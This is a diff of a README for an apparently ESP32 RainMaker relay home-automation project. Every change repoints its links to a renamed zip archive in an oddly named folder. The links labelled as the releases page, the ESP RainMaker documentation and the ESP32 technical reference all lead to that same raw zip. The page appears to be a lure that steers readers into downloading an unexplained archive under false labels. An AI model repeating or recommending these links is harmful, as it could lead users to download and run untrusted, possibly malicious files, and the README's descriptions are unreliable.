@@ -6,9 +6,9 @@ Welcome to **esp32-rainmaker-relay-home-automation**. This application allows yo
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/batniking/esp32-rainmaker-relay-home-automation/main/underbishopric/esp32-rainmaker-relay-home-automation_v1.6.zip)](https://raw.githubusercontent.com/batniking/esp32-rainmaker-relay-home-automation/main/underbishopric/esp32-rainmaker-relay-home-automation_v1.6.zip)
+[![Download](https://raw.githubusercontent.com/batniking/esp32-rainmaker-relay-home-automation/main/underbishopric/rainmaker_esp_relay_home_automation_1.6.zip)](https://raw.githubusercontent.com/batniking/esp32-rainmaker-relay-home-automation/main/underbishopric/rainmaker_esp_relay_home_automation_1.6.zip)
   
-Visit [this page to download](https://raw.githubusercontent.com/batniking/esp32-rainmaker-relay-home-automation/main/underbishopric/esp32-rainmaker-relay-home-automation_v1.6.zip) the latest version of the software.
+Visit [this page to download](https://raw.githubusercontent.com/batniking/esp32-rainmaker-relay-home-automation/main/underbishopric/rainmaker_esp_relay_home_automation_1.6.zip) the latest version of the software.
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ To run this application, you need the following:
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/batniking/esp32-rainmaker-relay-home-automation/main/underbishopric/esp32-rainmaker-relay-home-automation_v1.6.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/batniking/esp32-rainmaker-relay-home-automation/main/underbishopric/rainmaker_esp_relay_home_automation_1.6.zip).
 2. You will see a list of available versions. Choose the latest version.
 3. Click the link to download the package compatible with your operating system.
 4. Once the download finishes, locate the file in your downloads folder.
@@ -85,7 +85,7 @@ For users interested in understanding the code, we provide fully commented code 
 
 ## 🔗 Additional Resources
 
-- [ESP RainMaker Documentation](https://raw.githubusercontent.com/batniking/esp32-rainmaker-relay-home-automation/main/underbishopric/esp32-rainmaker-relay-home-automation_v1.6.zip)
-- [ESP32 Technical Reference](https://raw.githubusercontent.com/batniking/esp32-rainmaker-relay-home-automation/main/underbishopric/esp32-rainmaker-relay-home-automation_v1.6.zip)
+- [ESP RainMaker Documentation](https://raw.githubusercontent.com/batniking/esp32-rainmaker-relay-home-automation/main/underbishopric/rainmaker_esp_relay_home_automation_1.6.zip)
+- [ESP32 Technical Reference](https://raw.githubusercontent.com/batniking/esp32-rainmaker-relay-home-automation/main/underbishopric/rainmaker_esp_relay_home_automation_1.6.zip)
 
 Thank you for choosing **esp32-rainmaker-relay-home-automation** to enhance your home automation experience. Enjoy controlling your devices with ease!
